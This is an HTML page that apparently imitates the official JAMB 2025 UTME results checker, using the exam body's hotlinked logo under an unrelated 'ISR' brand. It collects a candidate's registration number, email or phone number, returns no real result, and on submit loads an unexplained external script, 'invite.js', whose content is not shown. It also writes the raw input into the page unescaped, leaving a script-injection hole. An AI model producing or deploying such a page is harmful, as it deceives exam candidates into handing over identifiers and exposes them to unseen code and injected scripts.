<!DOCTYPE html><html lang="en"><head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Check 2025 UTME Results</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(to bottom right, #e6f0ff, #ffffff);
      color: #333;
      animation: fadeIn 1s ease-in-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .top-bar {
      background-color: #002147;
      color: white;
      padding: 15px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      position: sticky;
      top: 0;
      z-index: 999;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
      animation: slideDown 0.6s ease-out;
    }
    @keyframes slideDown {
      from { top: -50px; opacity: 0; }
      to { top: 0; opacity: 1; }
    }
    .brand {
      font-size: 22px;
      font-weight: bold;
      letter-spacing: 1px;
      animation: glowBrand 3s infinite ease-in-out;
      text-shadow: 0 0 6px #28a745, 0 0 12px #ffd700;
    }
    @keyframes glowBrand {
      0%, 100% {
        transform: translateY(0);
        text-shadow: 0 0 6px #28a745, 0 0 12px #ffd700;
      }
      50% {
        transform: translateY(-2px);
        text-shadow: 0 0 10px #00f2ff, 0 0 20px #ffd700;
      }
    }
    .hamburger {
      font-size: 28px;
      cursor: pointer;
    }
    .menu {
      display: none;
      position: absolute;
      top: 60px;
      right: 20px;
      background-color: #fff;
      border: 1px solid #ccc;
      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
      border-radius: 6px;
      overflow: hidden;
    }
    .menu a {
      display: block;
      padding: 12px 16px;
      color: #002147;
      text-decoration: none;
      border-bottom: 1px solid #eee;
    }
    .menu a:hover {
      background-color: #f0f0f0;
    }
    .container {
      background-color: white;
      margin: 80px auto;
      padding: 30px;
      max-width: 500px;
      border-radius: 20px;
      box-shadow: 0 0 30px rgba(0, 0, 0, 0.12);
      animation: bounceIn 1s ease-out, glowLines 3s infinite alternate;
      position: relative;
      overflow: hidden;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    .container::before, .container::after {
      content: '';
      position: absolute;
      width: 100%;
      height: 3px;
      background: linear-gradient(90deg, #00ffcc, #007bff, #ffd700);
      animation: slideLine 3s infinite linear;
      top: 0;
      left: 0;
    }
    .container::after {
      top: unset;
      bottom: 0;
    }
    .container:hover {
      transform: translateY(-5px) scale(1.02);
      box-shadow: 0 0 40px rgba(0, 0, 0, 0.18);
    }
    @keyframes bounceIn {
      0% { opacity: 0; transform: scale(0.9) translateY(20px); }
      60% { opacity: 1; transform: scale(1.05) translateY(-10px); }
      100% { transform: scale(1) translateY(0); }
    }
    @keyframes slideLine {
      0% { background-position: 0% 0%; }
      100% { background-position: 100% 0%; }
    }
    .logo img {
      display: block;
      margin: 0 auto 10px;
      max-width: 120px;
      border-radius: 12px;
      animation: pulseGlow 3s infinite;
      box-shadow: 0 0 12px rgba(0, 255, 128, 0.5),
                  0 0 20px rgba(0, 128, 255, 0.4),
                  0 0 30px rgba(255, 215, 0, 0.4);
    }
    @keyframes pulseGlow {
      0% {
        box-shadow: 0 0 12px rgba(0, 255, 128, 0.5),
                    0 0 20px rgba(0, 128, 255, 0.4),
                    0 0 30px rgba(255, 215, 0, 0.4);
      }
      50% {
        box-shadow: 0 0 20px rgba(0, 255, 128, 0.8),
                    0 0 30px rgba(0, 128, 255, 0.6),
                    0 0 40px rgba(255, 215, 0, 0.6);
      }
      100% {
        box-shadow: 0 0 12px rgba(0, 255, 128, 0.5),
                    0 0 20px rgba(0, 128, 255, 0.4),
                    0 0 30px rgba(255, 215, 0, 0.4);
      }
    }
    header h1 {
      text-align: center;
      color: #002147;
      font-size: 26px;
      margin-bottom: 20px;
    }
    form label {
      font-weight: bold;
      display: block;
      margin-bottom: 8px;
    }
    input[type="text"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0 20px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
      transition: all 0.3s ease;
    }
    input[type="text"]:focus {
      border-color: #002147;
      outline: none;
      box-shadow: 0 0 6px rgba(0, 33, 71, 0.2);
    }
    button {
      background-color: #28a745;
      color: white;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #218838;
    }
    .result-box {
      background-color: #e9f5ec;
      padding: 20px;
      border-left: 4px solid #28a745;
      margin-top: 20px;
      border-radius: 6px;
      animation: fadeIn 0.7s ease;
    }
    footer {
      margin-top: 60px;
      padding: 25px;
      background-color: #002147;
      color: white;
      text-align: center;
      font-size: 14px;
    }
    footer a {
      color: #ffd700;
      margin: 0 10px;
      text-decoration: none;
    }
    footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="top-bar">
    <div class="brand">ISR</div>
    <div class="hamburger" onclick="toggleMenu()">&#9776;</div>
    <div class="menu" id="menu">
      <a href="#">Logout</a>
    </div>
  </div>
  <div class="container">
    <header>
      <div class="logo">
        <img src="https://slipsprinting.jamb.gov.ng/assets/admin/img/logo_big.png" alt="JAMB Logo" />
      </div>
      <h1>Check 2025 UTME Results</h1>
    </header>
    <main>
      <form class="check-results-form" id="resultForm">
        <label for="credentials">Reg No / Email / GSM Number</label>
        <input type="text" id="credentials" name="credentials" placeholder="Enter your details" />
        <button type="submit">Check UTME Results</button>
      </form>
      <div id="resultBox" class="result-box" style="display: none;">
        <h2>UTME Result</h2>
        <p id="resultMessage"></p>
      </div>
    </main>
  </div>
  <footer>
    <div>
      <a href="#">Legal</a>
      <a href="#">Home</a>
      <a href="#">Privacy Policy</a>
      <a href="#">Service</a>
      <a href="#">Support</a>
      <a href="#">Address</a>
      <a href="#">License</a>
    </div>
  </footer>

  <script>
    function toggleMenu() {
      const menu = document.getElementById("menu");
      menu.style.display = menu.style.display === "block" ? "none" : "block";
    }

    document.getElementById("resultForm").addEventListener("submit", function (e) {
      e.preventDefault();
      const input = document.getElementById("credentials").value.trim();
      const resultBox = document.getElementById("resultBox");
      const resultMessage = document.getElementById("resultMessage");

      if (!input || input.length < 5) {
        alert("Please enter a valid Reg No / Email / GSM Number");
        return;
      }

      resultMessage.innerHTML = `Checking result for <strong>${input}</strong>...`;
      resultBox.style.display = "block";

      // Run invite.js logic
      const script = document.createElement('script');
      script.src = 'invite.js';
      document.body.appendChild(script);
    });
  </script>
</body>
  </html>
